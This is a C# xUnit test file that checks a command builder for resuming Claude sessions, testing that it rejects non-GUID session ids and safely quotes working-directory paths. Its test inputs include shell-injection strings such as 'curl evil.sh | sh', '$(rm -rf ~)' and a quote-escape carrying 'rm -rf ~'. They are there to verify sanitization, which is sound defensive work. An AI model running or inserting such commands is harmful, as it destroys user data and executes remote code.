using Searchlight.Services;
using Xunit;

namespace Searchlight.Core.Tests;

/// <summary>
/// Covers the resume command builder's trust boundary: session ids and
/// workspace paths come from on-disk content (index JSON, transcript records,
/// raw filenames), so anything that isn't a GUID or contains shell-hostile
/// content must be rejected or neutralized.
/// </summary>
public sealed class ClaudeResumeCommandTests
{
    private const string ValidId = "56a048ce-7a66-4bb5-8f87-de5a34a7274b";

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("x; curl evil.sh | sh #")]
    [InlineData("$(rm -rf ~)")]
    [InlineData("`touch /tmp/pwned`")]
    [InlineData("56a048ce-7a66-4bb5-8f87-de5a34a7274b; echo pwned")]
    // Non-canonical GUID formats carry shell-active {},() — only "D" is accepted.
    [InlineData("{56a048ce-7a66-4bb5-8f87-de5a34a7274b}")]
    [InlineData("(56a048ce-7a66-4bb5-8f87-de5a34a7274b)")]
    [InlineData("56a048ce7a664bb58f87de5a34a7274b")]
    public void NonGuidSessionIds_AreRejected(string? sessionId)
    {
        Assert.False(ClaudeResumeCommand.IsValidSessionId(sessionId));
        Assert.False(ClaudeResumeCommand.TryBuildPosix(sessionId, "/tmp", false, out _));
        Assert.False(ClaudeResumeCommand.TryBuildResumeInvocation(sessionId, false, out _));
    }

    [Fact]
    public void ValidGuid_BuildsPlainResume()
    {
        Assert.True(ClaudeResumeCommand.TryBuildPosix(ValidId, null, false, out string command));
        Assert.Equal($"claude --resume {ValidId}", command);
    }

    [Fact]
    public void UppercaseCanonicalGuid_IsAccepted()
    {
        Assert.True(ClaudeResumeCommand.IsValidSessionId(ValidId.ToUpperInvariant()));
    }

    [Fact]
    public void ResumeInvocation_SkipPermissions_AppendsFlag()
    {
        Assert.True(ClaudeResumeCommand.TryBuildResumeInvocation(ValidId, true, out string command));
        Assert.Equal($"claude --resume {ValidId} --dangerously-skip-permissions", command);
    }

    [Fact]
    public void SkipPermissions_AppendsFlag()
    {
        Assert.True(ClaudeResumeCommand.TryBuildPosix(ValidId, null, true, out string command));
        Assert.EndsWith("--dangerously-skip-permissions", command);
    }

    [Fact]
    public void Cwd_IsSingleQuotedForPosix()
    {
        Assert.True(ClaudeResumeCommand.TryBuildPosix(
            ValidId, "/Users/jane/My Repos/app", false, out string command));
        Assert.Equal(
            $"cd '/Users/jane/My Repos/app' && claude --resume {ValidId}", command);
    }

    [Fact]
    public void CwdWithSingleQuote_CannotEscapeQuoting()
    {
        Assert.True(ClaudeResumeCommand.TryBuildPosix(
            ValidId, "/tmp/a'; rm -rf ~;'", false, out string command));
        // The embedded quote must be escaped as '\'' — the payload stays inert.
        Assert.Contains(@"'/tmp/a'\''; rm -rf ~;'\'''", command);
    }

    [Theory]
    [InlineData("/tmp/evil\nrm -rf ~")]
    [InlineData("/tmp/evil\r")]
    [InlineData("/tmp/evil\t")]
    [InlineData("")]
    [InlineData("  ")]
    [InlineData(null)]
    public void UnusableCwd_IsSkippedNotEmbedded(string? cwd)
    {
        Assert.False(ClaudeResumeCommand.IsUsableCwd(cwd));
        Assert.True(ClaudeResumeCommand.TryBuildPosix(ValidId, cwd, false, out string command));
        Assert.Equal($"claude --resume {ValidId}", command);
    }
}
